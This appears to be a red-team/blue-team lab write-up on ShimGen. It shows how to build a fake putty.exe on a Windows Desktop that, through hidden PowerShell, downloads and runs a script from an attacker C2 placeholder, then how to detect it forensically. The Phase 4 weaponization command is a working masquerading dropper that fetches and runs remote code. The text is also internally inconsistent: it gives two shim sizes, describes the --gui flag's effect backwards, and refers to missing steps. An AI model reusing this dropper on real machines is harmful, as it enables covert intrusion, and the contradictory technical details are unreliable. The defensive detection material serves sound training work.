# ShimGen — Masquerading & Proxy Execution

# Windows & Ubuntu VM

## The objective of this lab is to use ShimGen to generate a weaponized proxy executable that visually and functionally impersonates a legitimate application, silently delivering a PowerShell payload in memory — and then forensically expose the attack using process analysis, signature verification, and binary string extraction.

---

### Documentation and Scenario

**What is Proxy Execution?**

Windows offers dozens of built-in mechanisms for executing code. While attackers can deploy raw malware, a more evasive approach is **proxy execution**: abusing legitimate, pre-existing system binaries to indirectly invoke malicious code. The OS itself becomes complicit in the attack. A closely related technique is **masquerading**: making a malicious file look identical to a trusted one — same icon, same filename, same Desktop location — so the victim has no reason to be suspicious.

**ShimGen** combines both into a single, precise workflow. It is a command-line utility originally distributed with Chocolatey (the Windows package manager) for a legitimate purpose: generating small proxy binaries that redirect execution to tools installed in deep directory paths, making them accessible without modifying PATH. In attacker hands, it becomes a precision instrument for userland proxy execution with no OS-level modifications, no registry writes, and no elevated privilege required to generate the binary.

If you want to understand the original, legitimate use case, check the [Chocolatey ShimGen Documentation](https://docs.chocolatey.org/en-us/features/shim).

**Key Concepts:**

- *Shim (Proxy Executable)*: A small binary (~14 KB) generated by ShimGen. It contains no real application logic — it stores a target path and optional arguments, then executes them when invoked. The shim is the vehicle; the real weapon is what it points to.

- *`--path`*: The core ShimGen flag. Defines the real executable the shim will silently launch at runtime. `powershell.exe`, `cmd.exe`, `wscript.exe`, or any other binary on the system can be proxied through a shim, with no code of their own written to disk.

- *`--command`*: Hardcodes arbitrary arguments directly into the shim binary at generation time. Unlike `.bat` files or wrapper scripts, there is no separate text file left on disk — the full payload command lives baked inside the compiled `.exe`.

- *`--icon`*: Extracts and applies an icon from any `.exe`, `.dll`, or `.ico` file to the generated shim. This is the **visual identity theft** mechanism — the shim inherits the exact appearance of any application it is told to impersonate.

- *`--gui`*: Declares the generated binary as a GUI application rather than a console application. This suppresses the console window that would otherwise flash briefly during execution. With this flag, the attack is completely invisible to the victim.

- *`--output`*: Specifies the destination path and filename of the generated shim. Combined with a stolen icon and a carefully chosen filename, this controls where the weapon is planted.

- *Hardcoded Payload*: Because arguments are baked into the binary, there are no auxiliary script files or `.bat` wrappers that could be detected on disk alongside the executable. The command lives entirely inside the `.exe`.

- *No OS-Level Modification*: Unlike Application Shimming (which registers shim databases system-wide via `sdbinst.exe`), ShimGen-generated proxies are standalone files. No registry keys are written, no database files are installed, and the binary is self-contained.

>[!NOTE]
> ShimGen is a **"Living off the Land"** scenario inverted: instead of hijacking a pre-existing Windows binary, the attacker *generates* a new native PE binary that is structurally indistinguishable from a legitimately compiled application. The OS, the filesystem, and most endpoint tools see a regular `.exe` — because that is exactly what it is, structurally speaking. The deception is semantic, not structural.

### SCENARIO

- In this lab, we simulate a **social engineering + payload delivery attack** using two machines on the same subnet. *The Ubuntu VM acts as the attacker's Command & Control server*, while *the Windows VM represents a compromised corporate endpoint*.

- The attacker has already achieved initial access to the Windows machine. Their goal is now to plant a convincing payload dropper directly on the victim's Desktop — one that a user will naturally click, and one that will survive scrutiny at a glance. No startup registry keys, no scheduled tasks, no suspicious filenames in `System32`.

- The attacker uses ShimGen to fabricate a **fake `putty.exe`** — a perfect visual clone of the PuTTY SSH client that the victim uses daily. When executed, the fake binary silently contacts the Ubuntu C2 server, downloads and runs a PowerShell payload entirely in memory, and then launches the **real** PuTTY so the victim notices nothing unusual.

- For educational and safety purposes, the payload script (`payload.ps1`) performs benign proof-of-concept actions: writing an execution log to disk and issuing a trackable HTTP pingback to the C2 server. In a real engagement, this would be a reverse shell or a credential-harvesting beacon.

>[!IMPORTANT]
> You will start on the **Windows VM**, but consider all commands typed into the **Ubuntu Shell** as actions performed by the attacker on their remote staging server.

**Step 1 — `--path` and `--output`: The Core Proxy**

This is ShimGen at its simplest. In the **Windows powershell terminal**, generate a shim that does nothing but redirect execution to `notepad.exe`:

```powershell
.\shimgen.exe --path "C:\Windows\System32\notepad.exe" --output ".\test_basic.exe"
.\test_basic.exe
```

<img width="1191" height="572" alt="image" src="https://github.com/user-attachments/assets/f47e8ed8-62e1-4f0f-8db1-a502b750f1a0" />

Notepad opens. Inspect the generated file:

```powershell
(Get-Item ".\test_basic.exe").Length / 1KB
```

<img width="638" height="84" alt="image" src="https://github.com/user-attachments/assets/3b6b6a50-1da7-4fbe-a77c-fb877a128215" />

The generated shim weighs approximately **240 KB** — a self-contained binary wrapper. While this size reflects statically linked C++ runtime libraries (ensuring the proxy runs reliably on any Windows build without missing DLL errors), **there is zero Notepad code inside it**. It simply stores a pointer and, at runtime, hands execution over to whatever `--path` specified. This is the structural foundation every subsequent flag builds on.

**Step 2 — `--gui`: Console Suppression**

Compare execution visibility directly. First, generate a shim *without* `--gui`:

```powershell
.\shimgen.exe --path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --command '-c \"Start-Sleep 2\"' --output ".\test_nogui.exe"
.\test_nogui.exe
```

<img width="1295" height="184" alt="image" src="https://github.com/user-attachments/assets/f7bd027b-ab08-4cb9-9d3e-c7f8e02f8249" />

Nothing. PowerShell sleeps for two seconds and exits with no visual trace whatsoever. This flag is the operational difference between an attack that causes the victim to pause and one that goes completely unnoticed.

Now generate the same shim *with* `--gui`:

```powershell
.\shimgen.exe --path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --command '-c \"Start-Sleep 2\"' --gui --output ".\test_gui.exe"
.\test_gui.exe
```

You will notice a powershell window pops up for about 2 seconds. For the victim, this is an idicator of compromise - something ran in the background.

**Step 4 — `--command`: Hardcoded Argument Injection**

The `--command` flag bakes arbitrary arguments directly into the shim binary at generation time. There is no accompanying `.bat`, `.ps1`, or `.vbs` file — the instruction lives inside the `.exe` itself.

Generate a shim that passes a visible command to PowerShell to confirm the injection:

```powershell
.\shimgen.exe --path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --command '-NoExit -c \"Write-Host ''Argument injected from inside the shim binary''\"' --output ".\test_cmd.exe"
.\test_cmd.exe
```

<img width="1293" height="181" alt="image" src="https://github.com/user-attachments/assets/fb582724-342d-4042-80b5-9b2a2caa3b3a" />

Look closely at your folder: **there is no `.ps1`, `.bat`, or text script sitting on the disk.** Yet, PowerShell just executed a specific command. Where did it read it from? **Directly from the compiled `.exe` body.** This is the core offensive takeaway: `--command` turns a simple proxy into a **self-contained Trojan Horse**. In Phase 4, this exact memory slot will hold the live C2 callback URL — leaving zero script files behind for endpoint security to scan.

**Step 5 — `strings.exe`: Inspecting the Shim Internals**

Before building the actual weapon, apply the forensic lens to a test shim. Run the Sysinternals `strings.exe` utility against the command-injection shim you just created:

```powershell
.\strings.exe -accepteula .\test_cmd.exe
```

<img width="1299" height="898" alt="image" src="https://github.com/user-attachments/assets/b8939acc-b1d3-4c0a-83d7-e3d2e71d3cf8" />

Because scrolling manually through thousands of lines of raw binary scaffolding is inefficient, we can pipe the output into **`Select-String`** (PowerShell's native equivalent of `grep`) to instantly isolate specific keywords:

```powershell
.\strings.exe -accepteula .\test_cmd.exe | Select-String "powershell|Argument|shim"
```

Scroll through the output. Among the binary scaffolding, you will find the exact text you passed to `--command`, `powershell.exe` (the proxied target), and references to ShimGen itself — all stored as plaintext Unicode strings in the binary body.

>[!NOTE]
> ShimGen does not encrypt, compress, or obfuscate its embedded configuration. The `--path` target and the full `--command` string are stored as readable Unicode in the binary. This is the forensic weakness the Blue Team will exploit in Phase 6 — you are learning the technique here on a benign binary first so that applying it to the weapon in Phase 6 is a direct, familiar step.

### Phase 4: Weaponization (Windows)

With a clear understanding of each flag's effect, combine them into the final attack binary. This single command synthesises every technique explored in Phase 3:

```powershell
# Generate the proxy executable
.\shimgen.exe `
  --path    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
  --command '-WindowStyle Hidden -ExecutionPolicy Bypass -c \"IEX(New-Object Net.WebClient).DownloadString(''http://<UBUNTU_IP>:8001/payload.ps1'')\"' `
  --gui `
  --output  "C:\Users\Public\Desktop\putty.exe"

# Apply the stolen PuTTY icon
.\rcedit.exe "C:\Users\Public\Desktop\putty.exe" --set-icon "C:\Users\Public\putty.ico"
```

Each flag maps directly back to a capability demonstrated in isolation during Phase 3:

| Flag | Phase 3 Step | What It Contributes to the Attack |
|---|---|---|
| `--path powershell.exe` | Step 1 | Legitimate Windows binary used as execution proxy. No malicious executable is involved — only `powershell.exe`, which is trusted and signed by Microsoft. |
| `--command "..."` | Step 4 | Full C2 callback command hardcoded into the binary. No `.bat`, `.ps1`, or script file is written to disk on the Windows machine. |
| `rcedit --set-icon` | Step 3 | Fake binary is visually indistinguishable from the real PuTTY in File Explorer, on the Desktop, and in the Taskbar. |
| `--gui` | Step 2 | Execution is fully invisible. No console window, no flicker, no visual indication that anything happened. |
| `--output Desktop\putty.exe` | Step 1 | Dropper placed at exactly the location the victim expects PuTTY to be. |

Navigate to the Desktop in **File Explorer**. The fake `putty.exe` sits there bearing PuTTY's icon. Nothing — no file size, no icon, no filename, no location — would prompt a victim to hesitate.

### Phase 5: The Illusion Executes (Windows)

From this point, adopt the perspective of the **victim**. The attacker's work is complete on the Windows machine. All that remains is a user sitting down at their workstation and doing what they always do.

**Double-click the fake `putty.exe` on the Desktop.**

Observe what you see:

1. No console window. No flash. No visible activity.
2. **PuTTY opens.** The real `C:\Program Files\PuTTY\putty.exe` launches and displays its configuration dialog normally.
3. The victim sees exactly what they expected. They clicked PuTTY, PuTTY opened.

What actually happened in the background, during the fraction of a second between the click and PuTTY appearing on screen:

1. The shim launched `powershell.exe` with `-WindowStyle Hidden` — completely off-screen.
2. PowerShell fetched `payload.ps1` from the Ubuntu C2 server and executed it entirely in memory — nothing written to disk on the Windows machine at this stage.
3. The payload wrote a proof-of-concept execution log to `C:\Users\Public\shimgen_poc.log`.
4. The payload issued an HTTP pingback to the Ubuntu server, logging the compromise.
5. The payload launched the real PuTTY with `Start-Process`, completing the illusion.

Switch to the **Ubuntu terminal**. You will see an HTTP `GET` request for `payload.ps1` logged by the Python web server — the C2 callback, timestamped at the exact moment the victim clicked.

### Phase 6: Blue Team Detection

Time to switch perspective. You are a security analyst responding to an endpoint behavioural alert. You do not know what mechanism was used. You have one suspicious file on the Desktop and the task of reconstructing everything that happened.

Switch back to your **Administrator PowerShell** terminal.

---

**Step 1 — Verify the Execution Artifact**

The payload wrote a proof-of-concept log to disk. Inspect it:

```powershell
Get-Content "C:\Users\Public\shimgen_poc.log"
```

The log confirms that a PowerShell process executed silently and wrote output to disk. This is your first indicator: something ran that the victim did not knowingly trigger.

---

**Step 2 — Process Lineage Analysis**

Reconstruct the parent-child process chain from the Windows Security Event Log. Because `lab_start.ps1` enabled Process Creation auditing (Event ID 4688), every process launch since then has been recorded:

```powershell
Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4688 } -MaxEvents 200 |
  Where-Object { $_.Message -match 'putty|powershell' } |
  Select-Object TimeCreated,
    @{N='Process'; E={ ($_.Message -split 'New Process Name:\s+')[1] -split "`n" | Select-Object -First 1 }},
    @{N='Parent';  E={ ($_.Message -split 'Creator Process Name:\s+')[1] -split "`n" | Select-Object -First 1 }}
```

You are looking for a `powershell.exe` process whose **creator** is the fake `putty.exe` on the Desktop. Legitimate PuTTY is an SSH client — it never spawns PowerShell. This parent-child relationship is the **behavioural anomaly**. A real PuTTY process has no reason to create a hidden PowerShell child that makes outbound network connections.

---

**Step 3 — File Size Anomaly**

The fastest triage check in the investigation. Compare the sizes of the fake and real `putty.exe`:

```powershell
$fake = (Get-Item "C:\Users\Public\Desktop\putty.exe").Length
$real = (Get-Item "C:\Program Files\PuTTY\putty.exe").Length

"Fake putty.exe : $([math]::Round($fake / 1KB, 1)) KB"
"Real putty.exe : $([math]::Round($real / 1KB, 1)) KB"
```

The ShimGen-generated binary is approximately **14 KB**. The genuine PuTTY executable is over **1,400 KB**. A file claiming to be a full-featured SSH client with a GUI, TLS stack, and terminal emulator — yet weighing under 15 KB — is not that application. This check alone is sufficient to escalate a file for deeper forensic investigation.

---

**Step 4 — File Metadata and Version Information**

Legitimate applications embed metadata into their PE (Portable Executable) headers: product name, company name, version, copyright. Inspect the suspicious binary:

```powershell
(Get-Item "C:\Users\Public\Desktop\putty.exe").VersionInfo
```

The `ProductName`, `CompanyName`, `FileDescription`, and `LegalCopyright` fields will be empty or absent. Now compare with the real binary:

```powershell
(Get-Item "C:\Program Files\PuTTY\putty.exe").VersionInfo
```

The real PuTTY is stamped with `Simon Tatham`, the correct version string, and a full copyright notice. ShimGen creates structurally valid PE binaries, but it populates none of the standard version metadata. The fake borrowed the icon from PuTTY — it cannot borrow the provenance.

---

**Step 5 — Digital Signature Verification**

A legitimate application distributed by a trusted vendor carries a code-signing certificate. Verify whether the suspicious binary is signed:

```powershell
Get-AuthenticodeSignature "C:\Users\Public\Desktop\putty.exe" |
  Select-Object Status, StatusMessage, SignerCertificate
```

The result will be `NotSigned`. Now verify the authentic binary for contrast:

```powershell
Get-AuthenticodeSignature "C:\Program Files\PuTTY\putty.exe" |
  Select-Object Status, SignerCertificate
```

The real PuTTY distribution is signed. An unsigned binary bearing the icon of a known-signed application, at the location where that application is expected, is a definitive red flag. An icon can be copied in milliseconds. A certificate cannot.

---

**Step 6 — Binary String Extraction: Recovering the IoCs**

This is the investigative culmination. You already established in Phase 3, Step 5 that ShimGen stores its configuration as plaintext Unicode strings inside the generated binary. Now apply the same technique to the weapon:

```powershell
.\strings.exe -accepteula "C:\Users\Public\Desktop\putty.exe"
```

Examine the output carefully. Among the binary scaffolding, you will find:

- `powershell.exe` — the real process proxied behind the PuTTY icon
- `-WindowStyle Hidden -ExecutionPolicy Bypass` — the stealth execution flags
- The full `IEX(New-Object Net.WebClient).DownloadString(...)` command
- The attacker's **Ubuntu IP address** and port
- `payload.ps1` — the C2-hosted script filename
- Metadata strings containing references to ShimGen

These are your **Indicators of Compromise (IoCs)**. In a real investigation, these strings would be extracted, submitted to threat intelligence platforms, and used to hunt for identical binaries across the environment — all recovered from a single 14 KB file that was sitting on a victim's Desktop looking like an SSH client.

>[!NOTE]
> In Phase 3, Step 5, you used `strings.exe` on `test_cmd.exe` and found your own injected command in the output. The weapon uses exactly the same binary structure. The forensic technique transfers directly — what you learned on a benign shim is what unmasks the real attack.

### Conclusion

In this lab, you dissected ShimGen flag by flag before watching those capabilities converge into a complete attack. A 14 KB binary — generated in seconds, signed by no one, carrying no standalone malicious code — was sufficient to silently proxy a PowerShell C2 callback while maintaining a perfect visual illusion for the victim. No single signal tells the whole story — but together, they reconstruct the entire attack chain from a single suspicious file on a Desktop.
